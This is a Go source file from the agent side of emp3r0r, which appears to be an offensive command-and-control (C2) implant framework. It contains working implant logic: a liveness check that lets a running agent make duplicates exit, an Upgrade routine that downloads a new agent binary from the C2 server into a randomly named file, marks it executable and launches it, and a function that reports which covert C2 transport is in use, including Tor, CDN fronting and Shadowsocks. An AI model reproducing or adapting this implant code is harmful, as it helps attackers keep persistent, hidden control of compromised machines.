package agentutils

import (
	"context"
	"fmt"
	"io"
	"log"
	"net"
	"net/url"
	"os"
	"os/exec"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// is the agent alive?
// connect to emp3r0r_def.SocketName, send a message, see if we get a reply
func IsAgentAlive(c net.Conn) bool {
	log.Println("Testing if agent is alive...")
	defer c.Close()
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	replyFromAgent := make(chan string, 1)
	reader := func(r io.Reader) {
		buf := make([]byte, 1024)
		for ctx.Err() == nil {
			n, err := r.Read(buf[:])
			if err != nil {
				log.Printf("Read error: %v", err)
				cancel()
			}
			replyFromAgent <- string(buf[0:n])
		}
	}

	// listen for reply from agent
	go reader(c)

	// send hello to agent
	for ctx.Err() == nil {
		_, err := fmt.Fprintf(c, "%d", os.Getpid())
		if err != nil {
			log.Printf("Write error: %v, agent is likely to be dead", err)
			break
		}
		resp := <-replyFromAgent
		if strings.Contains(resp, "kill yourself") {
			log.Printf("Agent told me to die (%d)", os.Getpid())
			os.Exit(0)
		}
		if strings.Contains(resp, "emp3r0r") {
			log.Println("Yes it's alive")
			return true
		}
		util.TakeASnap()
	}

	return false
}

// Upgrade agent from https://ccAddress/agent
func Upgrade(checksum string) (out string) {
	tempfile := common.RuntimeConfig.AgentRoot + "/" + util.RandStr(util.RandInt(5, 15))
	_, err := c2transport.SmartDownload("", "agent", tempfile, checksum)
	if err != nil {
		return fmt.Sprintf("Error: Download agent: %v", err)
	}
	download_checksum := crypto.SHA256SumFile(tempfile)
	if checksum != download_checksum {
		return fmt.Sprintf("Error: checksum mismatch: %s expected, got %s", checksum, download_checksum)
	}
	err = os.Chmod(tempfile, 0o755)
	if err != nil {
		return fmt.Sprintf("Error: chmod %s: %v", tempfile, err)
	}
	cmd := exec.Command(tempfile)
	cmd.Env = append(os.Environ(), "REPLACE_AGENT=true")
	err = cmd.Start()
	if err != nil {
		return fmt.Sprintf("Error: %v", err)
	}

	return fmt.Sprintf("Agent started with PID %d", cmd.Process.Pid)
}

// set C2Transport string
func GenC2TransportString() (transport_str string) {
	if transport.IsTor(def.CCAddress) {
		return fmt.Sprintf("TOR (%s)", def.CCAddress)
	} else if common.RuntimeConfig.CDNProxy != "" {
		return fmt.Sprintf("CDN (%s)", common.RuntimeConfig.CDNProxy)
	} else if common.RuntimeConfig.UseKCP {
		return fmt.Sprintf("KCP (%s)",
			def.CCAddress)
	} else if common.RuntimeConfig.C2TransportProxy != "" {
		// parse proxy url
		proxyURL, err := url.Parse(common.RuntimeConfig.C2TransportProxy)
		if err != nil {
			log.Printf("invalid proxy URL: %v", err)
		}

		// if the proxy port is emp3r0r proxy server's port
		if proxyURL.Port() == common.RuntimeConfig.AgentSocksServerPort && proxyURL.Hostname() == "127.0.0.1" {
			return fmt.Sprintf("Reverse Proxy: %s", common.RuntimeConfig.C2TransportProxy)
		}
		if proxyURL.Port() == common.RuntimeConfig.ShadowsocksLocalSocksPort && proxyURL.Hostname() == "127.0.0.1" {
			return fmt.Sprintf("Auto Proxy: %s", common.RuntimeConfig.C2TransportProxy)
		}

		return fmt.Sprintf("Proxy %s", common.RuntimeConfig.C2TransportProxy)
	} else {
		return fmt.Sprintf("HTTP2 (%s)", def.CCAddress)
	}
}
